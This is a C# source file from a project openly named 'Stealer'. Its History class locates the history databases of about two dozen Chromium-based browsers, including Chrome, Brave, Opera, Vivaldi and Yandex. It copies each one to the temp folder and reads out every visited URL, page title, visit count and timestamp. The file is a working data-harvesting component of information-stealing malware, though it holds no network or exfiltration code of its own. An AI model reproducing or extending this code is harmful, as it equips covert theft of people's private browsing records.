using System;
using System.Collections.Generic;
using System.IO;

namespace Stealer
{
    internal class History
    {

        // Return list with arrays (url, title, visits, time)
        public static List<string[]> get()
        {
            // Path info
            string a_a = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
            string l_a = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
            string u_s = "\\User Data\\Default\\History";
            // Browsers list
            string[] chromiumBasedBrowsers = new string[]
            {
                l_a + "Google\\Chrome" + u_s,
                l_a + "Google(x86)\\Chrome" + u_s,
                l_a + "Chromium" + u_s,
                a_a + "Opera Software\\Opera Stable\\History",
                l_a + "BraveSoftware\\Brave-Browser" + u_s,
                l_a + "Epic Privacy Browser" + u_s,
                l_a + "Amigo" + u_s,
                l_a + "Vivaldi" + u_s,
                l_a + "Orbitum" + u_s,
                l_a + "Mail.Ru\\Atom" + u_s,
                l_a + "Kometa" + u_s,
                l_a + "Comodo\\Dragon" + u_s,
                l_a + "Torch" + u_s,
                l_a + "Comodo" + u_s,
                l_a + "Slimjet" + u_s,
                l_a + "360Browser\\Browser" + u_s,
                l_a + "Maxthon3" + u_s,
                l_a + "K-Melon" + u_s,
                l_a + "Sputnik\\Sputnik" + u_s,
                l_a + "Nichrome" + u_s,
                l_a + "CocCoc\\Browser" + u_s,
                l_a + "uCozMedia\\Uran" + u_s,
                l_a + "Chromodo" + u_s,
                l_a + "Yandex\\YandexBrowser" + u_s
            };

            List<string[]> history = new List<string[]>();
            // Database
            string tempHistoryLocation = "";

            // Search all browsers
            foreach (string browser in chromiumBasedBrowsers)
            {
                if (File.Exists(browser))
                {
                    tempHistoryLocation = Environment.GetEnvironmentVariable("temp") + "\\browserHistory";
                    if (File.Exists(tempHistoryLocation))
                    {
                        File.Delete(tempHistoryLocation);
                    }
                    File.Copy(browser, tempHistoryLocation);
                } else {
                    continue;
                }

                // Read chrome database
                cSQLite sSQLite = new cSQLite(tempHistoryLocation);
                sSQLite.ReadTable("urls");

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    // Get data from database
                    string url = Convert.ToString(sSQLite.GetValue(i, 1));
                    string title = Convert.ToString(sSQLite.GetValue(i, 2));
                    string visits = Convert.ToString(Convert.ToInt32(sSQLite.GetValue(i, 3)) + 1);
                    string time = Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64(sSQLite.GetValue(i, 5))), TimeZoneInfo.Local));


                    // If no data => break
                    if (string.IsNullOrEmpty(url))
                    {
                        break;
                    }
                    string[] credentials = new string[4]
                    {
                        url,
                        Crypt.toUTF8(title),
                        visits,
                        time
                    };
                    history.Add(credentials);
                    continue;
                }
                continue;
            }
            return history;
        }
    }
}